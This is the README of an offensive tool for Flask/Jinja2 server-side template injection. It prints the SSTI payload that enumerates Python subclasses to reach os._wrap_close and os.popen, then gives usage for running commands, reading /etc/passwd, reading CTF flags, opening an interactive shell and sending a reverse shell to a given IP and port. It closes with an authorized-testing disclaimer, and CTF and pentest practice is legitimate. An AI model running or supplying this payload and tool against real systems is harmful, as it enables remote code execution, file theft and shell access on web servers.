# Flask SSTI OSWrap Scanner

自动检测 Flask/Jinja2 SSTI 漏洞，定位 `os._wrap_close` 序号，一键命令执行。

## 原理

```python
{{''.__class__.__mro__[-1].__subclasses__()}}
```

发送 payload 获取所有子类列表 → 自动解析 HTML 找到 `os._wrap_close` 的索引 → 用 `os.popen` 执行命令。

## 安装

```bash
git clone https://github.com/yourname/flask-ssti-oswrap.git
cd flask-ssti-oswrap
pip install requests
```

或者直接下载 `ssti_oswrap.py` 单文件使用。

## 用法

```
usage: ssti_oswrap.py [-h] -u URL [-d DATA] [-H HEADER] [-c COOKIE]
                      [--proxy PROXY] [--find-only] [--cmd CMD] [--flag]

Flask SSTI - 自动定位 os._wrap_close + 命令执行
```

### GET 参数注入

```bash
python3 ssti_oswrap.py -u "http://target.com/?name=VULN"
```

### POST 表单注入

```bash
python3 ssti_oswrap.py -u "http://target.com/" -d "name=VULN"
```

### 只查找序号

```bash
python3 ssti_oswrap.py -u "http://target.com/?name=VULN" --find-only
```

### 执行单条命令

```bash
python3 ssti_oswrap.py -u "http://target.com/?name=VULN" --cmd "id"
python3 ssti_oswrap.py -u "http://target.com/?name=VULN" --cmd "cat /etc/passwd"
```

### 读 flag

```bash
python3 ssti_oswrap.py -u "http://target.com/?name=VULN" --flag
```

### 交互式 Shell

```bash
python3 ssti_oswrap.py -u "http://target.com/?name=VULN"
```

进入后支持：

| 命令                     | 说明         |
| ------------------------ | ------------ |
| `id`                     | 执行系统命令 |
| `read /etc/passwd`       | 读取文件     |
| `shell 192.168.1.1 4444` | 反弹 shell   |
| `help`                   | 查看帮助     |
| `exit`                   | 退出         |

### 请求头 / Cookie 注入

```bash
python3 ssti_oswrap.py -u "http://target.com/" -H "X-Forwarded-For: VULN"
python3 ssti_oswrap.py -u "http://target.com/" -c "session=VULN"
```

### 代理调试

```bash
python3 ssti_oswrap.py -u "http://target.com/?name=VULN" --proxy "http://127.0.0.1:8080"
```

## 参数说明

| 参数          | 说明                              |
| ------------- | --------------------------------- |
| `-u`          | 目标 URL（必填）                  |
| `-d`          | POST 数据，用 VULN 标记注入点     |
| `-H`          | 请求头，如 `X-Forwarded-For=VULN` |
| `-c`          | Cookie，如 `session=VULN`         |
| `--proxy`     | HTTP 代理                         |
| `--find-only` | 只查找序号，不进入交互            |
| `--cmd`       | 执行单条命令后退出                |
| `--flag`      | 尝试读取常见 flag 路径            |

## 工作流程

```
① 发送:  name={{''.__class__.__mro__[-1].__subclasses__()}}
② 解析:  从 HTML 中提取所有 class 名称
③ 匹配:  找到 os._wrap_close 的索引
④ 执行:  os.popen('id').read()
```

## 依赖

- Python 3.6+
- requests

## 免责声明

仅供授权的安全测试使用。请遵守相关法律法规，未经授权不得用于非法用途。
